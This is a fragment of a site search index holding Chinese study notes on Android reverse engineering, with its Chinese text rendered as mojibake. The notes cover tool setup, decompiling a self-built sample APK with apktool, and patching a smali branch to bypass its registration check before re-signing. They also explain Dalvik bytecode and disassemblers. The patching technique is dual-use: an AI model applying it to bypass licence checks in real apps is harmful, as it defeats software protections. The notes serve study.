"},{"id":183,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/android%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/1.%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","title":"1.åˆ†æç¯å¢ƒæ­å»º","section":"Androidé€†å‘åˆ†æ","content":"Android ç¨‹åºåˆ†æç¯å¢ƒæ­å»º #  Windows ç¯å¢ƒæ­å»º #    å®‰è£… JDKã€‚ä»¥ä¸‹å‘½ä»¤æ£€æµ‹æ˜¯å¦å®‰å…¨æˆåŠŸã€‚\n$ java -version   å®‰è£… android-sdkã€‚ä¸çŸ¥é“å“ªæ¬¡æ›´æ–°ä¹‹åï¼Œè¿™äº›å‘½ä»¤è¡Œå·¥å…·å…¨éƒ¨é›†æˆåˆ°äº† Android Studio é‡Œé¢ï¼Œåœ¨ Android Studio ä¸­æ‰“å¼€ SDK Manager å°±å¯ä»¥å®‰è£…ã€‚\nä»¥ä¸‹å‘½ä»¤æ£€æµ‹ä¸¤ä¸ªå·¥å…·æ˜¯å¦å®‰è£…æˆåŠŸï¼š\n$ adb --version Android Debug Bridge version 1.0.39 ...  $ emulator -version Android emulator version 28.0.23.0 (build_id 5264690) (CL:be2be19ca0131957449e8c0ded5e55070f9537b0) ...   NOTICE:\n æœ¬ä¹¦ä¸­çš„ç¯å¢ƒæ­å»ºå¤§å¤šéƒ½è¿‡æ—¶äº†ï¼Œå¼€å‘å·¥å…·å»ºè®®ç›´æ¥å®‰è£… Android Studioï¼Œé€†å‘å·¥å…·å»ºè®®ç›´æ¥å®‰è£…å¾çˆ±ç ´è§£çš„å®‰è£…åŒ…ã€‚  "},{"id":184,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/android%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/2.%E5%A6%82%E4%BD%95%E5%88%86%E6%9E%90%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F/","title":"2.å¦‚ä½•åˆ†æå®‰å“ç¨‹åº","section":"Androidé€†å‘åˆ†æ","content":"å¦‚ä½•åˆ†æå®‰å“ç¨‹åº #  ç¬¬ä¸€ä¸ªå®‰å“ç¨‹åº #  å·²ç»ä¸Šä¼ è‡³ githubï¼šhttps://github.com/shesl-meow/AndroidReverse.git\nç¼–è¯‘ç”Ÿæˆ .apk æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥åœ¨ Android Studio ä¸­è¿›è¡Œæ“ä½œã€‚\nç ´è§£ç¬¬ä¸€ä¸ªç¨‹åº #  åç¼–è¯‘ APK æ–‡ä»¶ #  å®‰è£… apktoolï¼Œè¿™æ˜¯ä¸€ä¸ª github çš„å¼€æºè½¯ä»¶ï¼šhttps://github.com/iBotPeaches/Apktool\nåœ¨ Windows ä¸‹ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ choco è¿›è¡Œå®‰è£…ï¼š\n\u0026gt; choco install apktool å…³äº apktool çš„ä½¿ç”¨æ•™ç¨‹å¯ä»¥å‚è€ƒï¼šapktool\nåˆ†æ APK æ–‡ä»¶ #  åœ¨ç›®æ ‡æ–‡ä»¶å¤¹ä¸‹ï¼ˆä¸å¼€å‘æ—¶çš„æºç ç›®å½•ç»“æ„æ˜¯ä¸€æ ·çš„ï¼‰ï¼š\n smali ç›®å½•å­˜æ”¾äº†ç¨‹åºçš„æ‰€æœ‰åæ±‡ç¼–ä»£ç  res ç›®å½•ä¸‹å­˜æ”¾äº†ç¨‹åºä¸­æ‰€æœ‰çš„èµ„æºæ–‡ä»¶  ä»¥ä¸Šçš„ Android ç¨‹åºçš„åˆ†ææ­¥éª¤ï¼š\n  res/values/strings.xml è¢«åŠ å¯†å­˜å‚¨ä¸º resources.arscï¼Œå½“ç¨‹åºè¢«åæ±‡ç¼–æˆåŠŸåè¿™ä¸ªæ–‡ä»¶ä¹Ÿè¢«è§£å¯†äº†å‡ºæ¥ã€‚\nåœ¨è¿™é‡Œå­˜å‚¨äº† Android ç¨‹åºä¸­å­˜å‚¨ä½¿ç”¨çš„æ‰€æœ‰å­—ç¬¦ä¸²ã€‚\nä½¿ç”¨ä»¥ä¸‹çš„å‘½ä»¤æŸ¥æ‰¾ æ³¨å†Œå¤±è´¥ çš„æç¤ºä¿¡æ¯ï¼š\n$ cat ./res/values/strings.xml | grep æ³¨å†Œé”™è¯¯ \u0026lt;string name=\u0026#34;unsuccess_msg\u0026#34;\u0026gt;æ³¨å†Œé”™è¯¯\u0026lt;/string\u0026gt;   æ‰€æœ‰çš„å­—ç¬¦ä¸²éƒ½åœ¨ gen/\u0026lt;packagename\u0026gt;/R.java æ–‡ä»¶çš„ String ç±»è¢«è¡¨ç¤ºï¼Œæ¯ä¸ªå­—ç¬¦ä¸²éƒ½æœ‰å”¯ä¸€çš„ int ç±»å‹ç´¢å¼•å€¼ã€‚\nè¿™ä¸ªç´¢å¼•å€¼ç»è¿‡ apktool åæ±‡ç¼–ä¹‹åï¼Œéƒ½ä¿å­˜åœ¨ä¸ string.xml æ–‡ä»¶åŒç›®å½•ä¸‹çš„ public.xml æ–‡ä»¶ä¸­ã€‚\nä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥æ‰¾ unsuccess_msg å¯¹åº”çš„ç´¢å¼•å€¼ï¼š\n$ cat ./res/values/public.xml | grep unsuccess_msg \u0026lt;public type=\u0026#34;string\u0026#34; name=\u0026#34;unsuccess_msg\u0026#34; id=\u0026#34;0x7f0b0027\u0026#34; /\u0026gt;   ç„¶ååœ¨æºä»£ç ä¸­æŸ¥æ‰¾ 0x7f0b0027 è¿™ä¸ªç´¢å¼•å€¼è°ƒç”¨çš„ä½ç½®ï¼š\n$ grep -rwn ./smali/ -e \u0026#34;0x7f0b0027\u0026#34; ./smali/com/example/reversetest/MainActivity$1.smali:97: const v1, 0x7f0b0027 ./smali/com/example/reversetest/R$string.smali:96:.field public static final unsuccess_msg:I = 0x7f0b0027   æˆ‘ä»¬å‘ç°å®ç°æ³¨å†Œå¤±è´¥çš„é€»è¾‘å­˜åœ¨äº MainActivity$1.smali è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç»§ç»­ç ”ç©¶è¿™ä¸ªæ–‡ä»¶ã€‚æš‚æ—¶çœ‹ä¸æ‡‚ smali ä»£ç ï¼Œæ­¤å¤„ç•¥è¿‡ã€‚\n  æ‰“å¼€ä»»æ„çš„æ–‡æœ¬ç¼–è¾‘å™¨ã€‚å°† if-nez p1, :cond_0 æ›´æ”¹ä¸º if-eqz p1, :cond_0ã€‚\n  é‡æ–°ç¼–è¯‘ apk æ–‡ä»¶å¹¶ç­¾å #  ä½¿ç”¨ä»¥ä¸‹çš„ apktool å‘½ä»¤é‡æ–°ç¼–è¯‘ apk æ–‡ä»¶ï¼š\n$ apktool b outdir ç¼–è¯‘ç”Ÿæˆçš„ apk æ–‡ä»¶è¿˜æ²¡æœ‰ç­¾åï¼Œä¸èƒ½å®‰è£…æµ‹è¯•ï¼Œæ¥ä¸‹æ¥éœ€è¦ä½¿ç”¨ apksigner å‘½ä»¤è¡Œå·¥å…·å¯¹ apk æ–‡ä»¶è¿›è¡Œç­¾åï¼ˆä¹¦ä¸­çš„æ—§ç‰ˆæœ¬ä½¿ç”¨ signapk.jarï¼‰ï¼Œä½¿ç”¨ç»†èŠ‚è§ï¼šapksigner\nï¼ˆç­¾åä¹‹åä¼¼ä¹åªæ˜¯å¤§å°å˜å¤§äº†ï¼‰\né€šè¿‡ä»¥ä¸‹çš„å‘½ä»¤å®‰è£… apk æ–‡ä»¶ï¼ˆadb å‘½ä»¤ä½¿ç”¨ç»†èŠ‚è§ adb ï¼‰ï¼š\n$ adb install testapp.apk "},{"id":185,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/android%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/3.dalvik%E8%99%9A%E6%8B%9F%E6%9C%BA/","title":"3. Dalvikè™šæ‹Ÿæœº","section":"Androidé€†å‘åˆ†æ","content":"Android Dalvik è™šæ‹Ÿæœº #  è™½ç„¶ Android å¹³å°ä½¿ç”¨ Java è¯­è¨€æ¥å¼€å‘åº”ç”¨ç¨‹åºï¼Œä½† Android ç¨‹åºå´ä¸æ˜¯è¿è¡Œåœ¨æ ‡å‡† Java è™šæ‹Ÿæœºä¸Šï¼Œè€Œæ˜¯ Dalvik Virtual Machineï¼ˆDalvik è™šæ‹Ÿæœºï¼‰ã€‚\nDalvik è™šæ‹Ÿæœºçš„ç‰¹ç‚¹ #  ä¸ Java è™šæ‹Ÿæœºçš„åŒºåˆ« #  ä¸»è¦åŒºåˆ«ï¼š\n  Java è™šæ‹Ÿæœºè¿è¡Œçš„æ˜¯ Java å­—èŠ‚ç ï¼ŒDalvik è™šæ‹Ÿæœºè¿è¡Œçš„æ˜¯ Dalvik å­—èŠ‚ç ã€‚\næ‰€æœ‰çš„ Dalvik å­—èŠ‚ç ç”± Java å­—èŠ‚ç è½¬åŒ–è€Œæ¥ï¼Œå¹¶ä¸”è¢«æ‰“åŒ…åˆ°ä¸€ä¸ª DEXï¼ˆDalvik Executableï¼‰å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚Dalvik è™šæ‹Ÿæœºé€šè¿‡è§£é‡Š DEX æ–‡ä»¶æ¥æ‰§è¡Œè¿™äº›å­—èŠ‚ç ã€‚\n  Dalvik å¯æ‰§è¡Œæ–‡ä»¶ä½“ç§¯æ›´å°ã€‚\nAndroid SDK ä¸­æœ‰ä¸€ä¸ªå« dx çš„å·¥å…·è´Ÿè´£å°† Java å­—èŠ‚ç è½¬æ¢ä¸º Dalvik å­—èŠ‚ç ã€‚\n  Java è™šæ‹Ÿæœºä¸ Dalvik è™šæ‹Ÿæœºæ¶æ„ä¸åŒã€‚\nJava è™šæ‹ŸæœºåŸºäºæ ˆç»“æ„ã€‚ç¨‹åºåœ¨è¿è¡Œæ—¶éœ€è¦é¢‘ç¹åœ°ä»æ ˆä¸Šè¯»å–æˆ–å†™å…¥æ•°æ®ã€‚\nDalvik è™šæ‹ŸæœºåŸºäºå¯„å­˜å™¨æ¶æ„ã€‚æ•°æ®çš„è®¿é—®é€šè¿‡å¯„å­˜å™¨é—´ç›´æ¥ä¼ é€’ã€‚\n  å®ä¾‹ï¼š\n  ç¼–å†™ Java ç¨‹åºå¦‚ä¸‹ï¼š\n// Hello.java public class Hello { \tpublic int foo(int a, int b) { \treturn (a+b) * (a-b); \t}  \tpublic static void main(String[] argc) { \tHello hello = new Hello(); \tSystem.out.println(hello.foo(5,3)); \t} }   æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ç”Ÿæˆ .class æ–‡ä»¶ï¼š\n$ javac Hello.java æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ç”Ÿæˆ .dex æ–‡ä»¶ï¼š\n$ dx --dex --output=Hello.dex Hello.class   ä½¿ç”¨ javap åç¼–è¯‘ Hello.class æŸ¥çœ‹ foo() å‡½æ•°çš„ Java å­—èŠ‚ç ï¼š\n$ javap -c -classpath . Hello ...  public int foo(int, int);  Code:  0: iload_1  1: iload_2  2: iadd  3: iload_1  4: iload_2  5: isub  6: imul  7: ireturn ... Java è™šæ‹Ÿæœºçš„æŒ‡ä»¤é›†è¢«ç§°ä¸ºé›¶åœ°å€æŒ‡ä»¤é›†ï¼Œæ˜¯æŒ‡æŒ‡ä»¤é›†çš„ç›®æ ‡å‚æ•°å’Œæºå‚æ•°éƒ½æ˜¯éšå«çš„ï¼Œå®ƒé€šè¿‡ Java è™šæ‹Ÿæœºä¸­ä¸€ä¸ªç§°ä½œâ€æ±‚å€¼æ ˆâ€œçš„æ•°æ®ç»“æ„ä¼ é€’ã€‚\nå®Œæ•´çš„ Java å­—èŠ‚ç æŒ‡ä»¤åˆ—è¡¨å¯ä»¥å‚è€ƒç»´åŸºç™¾ç§‘ï¼šhttps://en.wikipedia.org/wiki/Java_bytecode_instruction_listings\n  ä½¿ç”¨ dexdump å¯ä»¥æŸ¥çœ‹ Dalvik å­—èŠ‚ç ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š\n$ dexdump -d Hello.dex ...  Virtual methods -  #0 : (in LHello;)  name : \u0026#39;foo\u0026#39;  type : \u0026#39;(II)I\u0026#39;  access : 0x0001 (PUBLIC)  code -  registers : 5  ins : 3  outs : 0  insns size : 6 16-bit code units 000198: |[000198] Hello.foo:(II)I 0001a8: 9000 0304 |0000: add-int v0, v3, v4 0001ac: 9101 0304 |0002: sub-int v1, v3, v4 0001b0: b210 |0004: mul-int/2addr v0, v1 0001b2: 0f00 |0005: return v0  catches : (none)  positions :  0x0000 line=3  locals :  0x0000 - 0x0006 reg=2 this LHello; ...   Dalvik è™šæ‹Ÿæœºæ˜¯å¦‚ä½•æ‰§è¡Œç¨‹åºçš„ #  Dalvik è™šæ‹Ÿæœºå±äº Android è¿è¡Œæ—¶ç¯å¢ƒï¼Œå®ƒä¸ä¸€äº›æ ¸å¿ƒåº“å…±åŒæ‰¿æ‹… Android åº”ç”¨ç¨‹åºçš„è¿è¡Œå·¥ä½œã€‚\nç®€è¿°ï¼š\n  Android ç³»ç»Ÿå¯åŠ¨åŠ è½½å®Œå†…æ ¸ä¹‹åï¼Œç¬¬ä¸€ä¸ªæ‰§è¡Œçš„æ˜¯ init è¿›ç¨‹\nå®ƒé¦–å…ˆè¦åšçš„æ˜¯è®¾å¤‡çš„åˆå§‹åŒ–å·¥ä½œï¼Œç„¶åè¯»å– inic.rc æ–‡ä»¶å¹¶å¯åŠ¨ç³»ç»Ÿä¸­çš„é‡è¦å¤–éƒ¨ç¨‹åº Zygoteã€‚\n  Zygote è¿›ç¨‹æ˜¯ Android æ‰€æœ‰è¿›ç¨‹çš„å­µåŒ–å™¨è¿›ç¨‹\nå®ƒå¯åŠ¨åä¼šé¦–å…ˆåˆå§‹åŒ– Dalvik è™šæ‹Ÿæœºï¼Œç„¶åå¯åŠ¨ system_server å¹¶è¿›å…¥ Zygote æ¨¡å¼ï¼Œé€šè¿‡ socket ç­‰å¾…å‘½ä»¤ã€‚\n  å½“æ‰§è¡Œä¸€ä¸ª Android åº”ç”¨ç¨‹åºæ—¶ï¼Œsystem_server è¿›ç¨‹é€šè¿‡ Binder IPC æ–¹å¼å‘é€å‘½ä»¤ç»™ Zygoteï¼ŒZygote æ”¶åˆ°å‘½ä»¤åé€šè¿‡ fork è‡ªèº«åˆ›å»ºä¸€ä¸ª Dalvik è™šæ‹Ÿæœºçš„å®ä¾‹æ¥æ‰§è¡Œåº”ç”¨ç¨‹åºçš„å…¥å£å‡½æ•°ã€‚\n  å½“è¿›ç¨‹ fork æˆåŠŸåï¼Œæ‰§è¡Œçš„å·¥ä½œå°±äº¤ç»™äº† Dalvik è™šæ‹Ÿæœºã€‚\nDalvik è™šæ‹Ÿæœºé¦–å…ˆé€šè¿‡ loadClassFromDex() å‡½æ•°å®Œæˆç±»çš„è£…è½½å·¥ä½œï¼Œæ¯ä¸ªç±»è¢«æˆåŠŸè§£æåéƒ½ä¼šæ‹¥æœ‰ä¸€ä¸ª ClassObject ç±»å‹çš„æ•°æ®ç»“æ„å­˜å‚¨åœ¨è¿è¡Œæ—¶ç¯å¢ƒä¸­ï¼Œè™šæ‹Ÿæœºä½¿ç”¨ gDvm.loadedClasses å…¨å±€å“ˆå¸Œè¡¨æ¥å­˜å‚¨ä¸æŸ¥è¯¢æ‰€æœ‰è£…è½½è¿›æ¥çš„ç±»ã€‚\n  éšåï¼Œå­—èŠ‚ç éªŒè¯å™¨ä½¿ç”¨ dvmVerifyCodeFlow() å‡½æ•°å¯¹è£…å…¥çš„ä»£ç è¿›è¡Œæ ¡éªŒã€‚\n  æ¥ç€è™šæ‹Ÿæœºè°ƒç”¨ FindClass() å‡½æ•°æŸ¥æ‰¾å¹¶è£…è½½ main æ–¹æ³•ç±»ï¼Œéšåè°ƒç”¨ dvmInterpret() å‡½æ•°åˆå§‹åŒ–è§£é‡Šå™¨å¹¶æ‰§è¡Œå­—èŠ‚ç æµã€‚\n  Dalvik è™šæ‹Ÿæœº JITï¼ˆå³æ—¶ç¼–è¯‘ï¼‰ #  ä¸»æµçš„ JIT åŒ…æ‹¬ä¸¤ç§å­—èŠ‚ç ç¼–è¯‘æ–¹å¼ï¼š\n method æ–¹å¼ï¼šä»¥å‡½æ•°æˆ–æ–¹æ³•ä¸ºå•ä½è¿›è¡Œç¼–è¯‘ï¼› trace æ–¹å¼ï¼šä»¥ trace ä¸ºå•ä½è¿›è¡Œç¼–è¯‘ã€‚ç¼–è¯‘æ‰§è¡Œæ¯”è¾ƒé¢‘ç¹çš„ â€çƒ­è·¯å¾„â€œ ä»£ç ã€‚  Dalvik æ±‡ç¼–è¯­è¨€åŸºç¡€ #  Dalvik æŒ‡ä»¤æ ¼å¼ #  ä¸€æ®µ Dalvik æ±‡ç¼–ä»£ç ç”±ä¸€ç³»åˆ— Dalvik æŒ‡ä»¤ç»„æˆï¼ŒæŒ‡ä»¤è¯­æ³•ç”±æŒ‡ä»¤çš„ä½æè¿°ä¸æŒ‡ä»¤æ ¼å¼æ ‡è¯†æ¥å†³å®šã€‚\nä½æè¿°çš„çº¦å®šå¦‚ä¸‹ï¼š\n æ¯ 16 ä½çš„å­—é‡‡ç”¨ç©ºæ ¼åˆ†éš”å¼€æ¥ã€‚ æ¯ä¸ªå­—æ¯è¡¨ç¤º 4 ä½ï¼Œæ¯ä¸ªå­—æ¯æŒ‰é¡ºåºä»é«˜å­—èŠ‚å¼€å§‹ï¼Œæ’åˆ—åˆ°ä½å­—èŠ‚ã€‚ å››ä½çš„å†…éƒ¨å¯ä»¥ç”¨ â€|â€œ æ¥è¡¨ç¤ºä¸åŒçš„å†…å®¹ã€‚ é¡ºåºé‡‡ç”¨ A~Z çš„å•ä¸ªå¤§å†™å­—æ¯è¡¨ç¤ºä¸€ä¸ª 4 ä½æ“ä½œç ï¼Œop è¡¨ç¤ºä¸€ä¸ª 8 ä½æ“ä½œç ã€‚ â€$$\\varnothing$$â€œ æ¥è¡¨ç¤ºè¿™ä¸ªå­—æ®µçš„æ‰€æœ‰ä½ä¸º 0ã€‚  ä¾‹å­ï¼šâ€A|G|op BBBB F|E|D|Câ€œ\næŒ‡ä»¤æ ¼å¼çš„çº¦å®šå¦‚ä¸‹ï¼š\n æŒ‡ä»¤æ ¼å¼æ ‡è¯†å¤§å¤šç”±ä¸‰ä¸ªå­—ç¬¦ç»„æˆï¼Œå‰ä¸¤ä¸ªæ˜¯æ•°å­—ï¼Œæœ€åä¸€ä¸ªæ˜¯å­—æ¯ï¼› ç¬¬ä¸€ä¸ªæ•°å­—æ˜¯è¡¨ç¤ºæŒ‡ä»¤æœ‰å¤šå°‘ä¸ª 16 ä½çš„å­—ç»„æˆï¼› ç¬¬äºŒä¸ªæ•°å­—æ˜¯è¡¨ç¤ºæŒ‡ä»¤æœ€å¤šä½¿ç”¨å¯„å­˜å™¨çš„ä¸ªæ•°ã€‚ç‰¹æ®Šæ ‡è®° â€râ€œ æ ‡è¯†ä½¿ç”¨ä¸€å®šèŒƒå›´å†…çš„å¯„å­˜å™¨ã€‚ ç¬¬ä¸‰ä¸ªå­—æ¯è¡¨ç¤ºç±»å‹ç ï¼Œè¡¨ç¤ºæŒ‡ä»¤ç”¨åˆ°çš„é¢å¤–æ•°æ®çš„ç±»å‹ï¼›å¯èƒ½å€¼å¦‚ä¸‹è¡¨æ‰€ç¤ºï¼š     åŠ©è®°ç¬¦ ä½å¤§å° è¯´æ˜     b 8 8 ä½æœ‰ç¬¦å·ç«‹å³æ•°   c 16, 32 å¸¸é‡æ± ç´¢å¼•   f 16 æ¥å£å¸¸é‡ï¼ˆä»…å¯¹é™æ€é“¾æ¥æ ¼å¼æœ‰æ•ˆï¼‰   h 16 æœ‰ç¬¦å·ç«‹å³æ•°ï¼ˆ32 ä½æˆ– 64 ä½æ•°çš„é«˜ä½å€¼ï¼Œä½ä½ä¸º 0ï¼‰   i 32 ç«‹å³æ•°ï¼Œæœ‰ç¬¦å·æ•´æ•°æˆ– 32 ä½æµ®ç‚¹æ•°   l 64 ç«‹å³æ•°ï¼Œæœ‰ç¬¦å·æ•´æ•°æˆ– 64 ä½åŒç²¾åº¦æµ®ç‚¹æ•°   m 16 æ–¹æ³•å¸¸é‡ï¼ˆä»…å¯¹é™æ€é“¾æ¥æ ¼å¼æœ‰æ•ˆï¼‰   n 4 4 ä½ç«‹å³æ•°   s 16 çŸ­æ•´å½¢ç«‹å³æ•°   t 8, 16, 32 è·³è½¬ã€åˆ†æ”¯   x 0 æ— é¢å¤–æ•°æ®    æœ€æ–°çš„ Dalvik å­—èŠ‚ç  Referenceï¼šhttps://source.android.com/devices/tech/dalvik/dalvik-bytecode\nå¦å¤–ï¼ŒDalvik å¯¹è¯­æ³•åšäº†ä¸€äº›é¢å¤–çš„è¯´æ˜ï¼š\n  æ¯ä¸ªæŒ‡ä»¤ä»¥å‘½åçš„æ“ä½œç å¼€å§‹ï¼Œåé¢å¯é€‰æ‹©ä½¿ç”¨ä¸€ä¸ªæˆ–å¤šä¸ªå‚æ•°ï¼Œå¹¶ä¸”å‚æ•°ä¹‹é—´ç”¨é€—å·åˆ†éš”ã€‚\n  æ¯æ¡æŒ‡ä»¤çš„å‚æ•°ä»æŒ‡ä»¤çš„ç¬¬ä¸€éƒ¨åˆ†å¼€å§‹ï¼Œop ä½äºä½ 8 ä½ï¼Œé«˜ 8 ä½å¯ä»¥æ˜¯ä¸€ä¸ª 8 ä½çš„å‚æ•°ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸¤ä¸ª 4 ä½çš„å‚æ•°ï¼Œä¹Ÿå¯ä»¥ä¸ºç©ºï¼›å¦‚æœæŒ‡ä»¤è¶…è¿‡ 16 ä½ï¼Œåˆ™åé¢çš„éƒ¨åˆ†ä¾æ¬¡ä½œä¸ºå‚æ•°ã€‚\n  å‘½åå¯„å­˜å™¨çš„å‚æ•°å½¢å¼ä¸ºâ€œvXâ€ï¼Œæ¯”å¦‚ï¼šv0, v1ã€‚é€‰æ‹©â€œvâ€è€Œä¸æ˜¯æ›´å¸¸ç”¨çš„â€œrâ€ä½œä¸ºå‰ç¼€ï¼Œæ˜¯å› ä¸ºè¿™æ ·å¯é¿å…ä¸å¯èƒ½ä¼šåœ¨å…¶ä¸Šå®ç° Dalvik å¯æ‰§è¡Œæ ¼å¼çš„ï¼ˆéè™šæ‹Ÿï¼‰æ¶æ„ï¼ˆå…¶å¯„å­˜å™¨ä½¿ç”¨â€œrâ€ä½œä¸ºå‰ç¼€ï¼‰å‡ºç°å†²çªã€‚\nï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æˆªäº†å½“åœ°åŒæ—¶è®¨è®ºè™šæ‹Ÿå’Œå®é™…å¯„å­˜å™¨ã€‚ï¼‰\n  è¡¨ç¤ºå­—é¢é‡ã€å¸¸æ•°çš„å‚æ•°å½¢å¼ä¸ºâ€œ#+Xâ€ã€‚æœ‰äº›æ ¼å¼è¡¨ç¤ºé«˜é˜¶ä½ä»…ä¸ºéé›¶ä½çš„å­—é¢é‡ï¼›å¯¹äºè¿™ç§ç±»å‹çš„å­—é¢é‡ï¼Œåœ¨è¯­æ³•è¡¨ç¤ºæ—¶ä¼šæ˜ç¡®å†™å‡ºåé¢çš„ 0ï¼Œä½†æ˜¯åœ¨æŒ‰ä½è¡¨ç¤ºæ—¶è¿™äº› 0 ä¼šè¢«çœç•¥ã€‚\n  è¡¨ç¤ºç›¸å¯¹æŒ‡ä»¤åœ°å€åç§»é‡çš„å‚æ•°å½¢å¼ä¸ºâ€œ+Xâ€ã€‚\n  è¡¨ç¤ºå­—é¢é‡å¸¸é‡æ± ç´¢å¼•çš„å‚æ•°å½¢å¼ä¸ºâ€œkind@Xâ€ï¼Œå…¶ä¸­â€œkindâ€è¡¨ç¤ºæ­£åœ¨å¼•ç”¨çš„å¸¸é‡æ± ã€‚æ¯ä¸ªä½¿ç”¨æ­¤ç±»æ ¼å¼çš„æ“ä½œç æ˜ç¡®åœ°è¡¨ç¤ºåªå…è®¸ä½¿ç”¨ä¸€ç§å¸¸é‡ï¼›è¯·æŸ¥çœ‹æ“ä½œç å‚è€ƒï¼Œæ‰¾å‡ºå¯¹åº”å…³ç³»ã€‚\nå¸¸é‡æ± çš„ç§ç±»åŒ…æ‹¬â€œstringâ€ï¼ˆå­—ç¬¦ä¸²æ± ç´¢å¼•ï¼‰ã€â€œtypeâ€ï¼ˆç±»å‹æ± ç´¢å¼•ï¼‰ã€â€œfieldâ€ï¼ˆå­—æ®µæ± ç´¢å¼•ï¼‰ ã€â€œmethâ€ ï¼ˆæ–¹æ³•æ± ç´¢å¼•ï¼‰å’Œâ€œsiteâ€ï¼ˆè°ƒç”¨ç‚¹ç´¢å¼•ï¼‰ã€‚\n  DEX æ–‡ä»¶åæ±‡ç¼–å·¥å…· #  ç›®å‰ DEX å¯æ‰§è¡Œæ–‡ä»¶ä¸»æµçš„åæ±‡ç¼–å·¥å…·æœ‰ BakSmali å’Œ Dedexerã€‚\næµ‹è¯•ä»£ç ä½¿ç”¨ä¹‹å‰çš„ Hello.javaï¼Œä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ç¼–è¯‘ç”Ÿæˆ dex æ–‡ä»¶ï¼š\n$ javac Hello.java  $ dx --dex --output=Hello.dex Hello.class   ä½¿ç”¨ baksmali.jar é€šè¿‡ä»¥ä¸‹çš„å‘½ä»¤åæ±‡ç¼– Hello.dexï¼ˆbakmali çš„ä½¿ç”¨æ–¹æ³•ä¸ä¹¦æœ¬æè¿°ä¸ä¸€æ ·ï¼Œè¯¦ç»†ä½¿ç”¨æ–¹æ³•å¯ä»¥hiä½¿ç”¨ java -jar baksmali.jar help æŸ¥çœ‹æ›´åŠ è¯¦ç»†çš„ä½¿ç”¨æ–¹æ³•ï¼‰ï¼š\n$ java -jar baksmali.jar dis -o baksmaliout Hello.dex  $ cat baksmaliout/Hello.smali ... # virtual methods .method public foo(II)I  .registers 5   .prologue  .line 3  add-int v0, p1, p2   sub-int v1, p1, p2   mul-int/2addr v0, v1   return v0 .end method è¯¥å‘½ä»¤æˆåŠŸæ‰§è¡Œåï¼Œä¼šç”Ÿæˆ baksmali/Hello.smali æ–‡ä»¶ã€‚\n  ä½¿ç”¨ ddx.jar é€šè¿‡ä»¥ä¸‹çš„å‘½ä»¤åæ±‡ç¼– Hello.dexï¼š\n$ java -jar ddx.jar -d ddxout Hello.dex  $ cat ddxout/Hello.ddx ... .method public foo(II)I \tadd-int\tv0,v3,v4 \tsub-int\tv1,v3,v4 \tmul-int/2addr\tv0,v1 \treturn\tv0 .end method å‘½ä»¤æ‰§è¡ŒæˆåŠŸåï¼Œä¼šç”Ÿæˆ ddxout/Hello.ddx æ–‡ä»¶ã€‚\n  ä¸¤ç§åæ±‡ç¼–ä»£ç çš„ç»“æ„ç»„ç»‡æ˜¯ä¸€æ ·çš„ï¼Œåœ¨æ–¹æ³•åã€å­—æ®µç±»å‹ä¸ä»£ç æŒ‡ä»¤åºåˆ—ä¸Šå®ƒä»¬ä¿æŒå·²çŸ¥ï¼Œå…·ä½“è¡¨ç°åœ¨ä¸€äº›è¯­æ³•ç»†èŠ‚ä¸Šï¼š\n å‰è€…ä½¿ç”¨ .registers æŒ‡ä»¤æŒ‡å®šå‡½æ•°ç”¨åˆ°çš„å¯„å­˜å™¨æ•°ç›®ï¼Œåè€…åˆ™åœ¨ .registers ä¹‹å‰åŠ äº† limit å‰ç¼€ï¼› å‰è€…ä½¿ç”¨ p0 åš this å¼•ç”¨ï¼Œåè€…åˆ™ä½¿ç”¨ v2 åš this å¼•ç”¨ï¼› å‰è€…ä½¿ç”¨ .parameter æŒ‡å®šå‚æ•°ï¼Œåè€…åˆ™ä½¿ç”¨ parameter æ•°ç»„ æŒ‡å®šå‚æ•°ï¼› å‰è€…ä½¿ç”¨ .prologue åšå‡½æ•°ä»£ç çš„èµ·å§‹ä½ç½®ï¼Œåè€…æ²¡æœ‰ï¼› å‰è€…ä½¿ç”¨ p å‘½åæ³•å‘½åå¯„å­˜å™¨ï¼Œåè€…ä½¿ç”¨ v å‘½åæ³•å‘½åå¯„å­˜å™¨ã€‚    Dalvik å¯„å­˜å™¨ #   ANDROID æºç å¯ä»¥åœ¨ä»¥ä¸‹ç½‘å€æŸ¥çœ‹ï¼šhttps://android.googlesource.com\nGITHUB ä¸Šæœ‰æºç çš„é•œåƒï¼šhttps://github.com/aosp-mirror\n  Dalvik æºç å¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„å‘½ä»¤ä¸‹è½½æœ€æ–°ç‰ˆæœ¬ï¼ˆå®˜ç½‘æ€»æ˜¯ Timeoutï¼‰ï¼š\n$ git clone --depth=1 https://github.com/aosp-mirror/platform_dalvik.git dalvik  $ cd dalvik  $ git fetch --depth=1 origin gingerbread:gingerbread # ä¹¦æœ¬ä¸Šçš„æºç è®²çš„æ˜¯ gingerbread è¿™ä¸ªåˆ†æ”¯çš„æºç   Dalvik è™šæ‹ŸæœºåŸºäºå¯„å­˜å™¨æ¶æ„ï¼Œåœ¨è®¾è®¡ä¹‹åˆé‡‡ç”¨äº† ARM æ¶æ„ï¼ˆCPU æœ¬èº«é›†æˆäº†å¤šä¸ªå¯„å­˜å™¨ï¼‰ã€‚\nDalvik 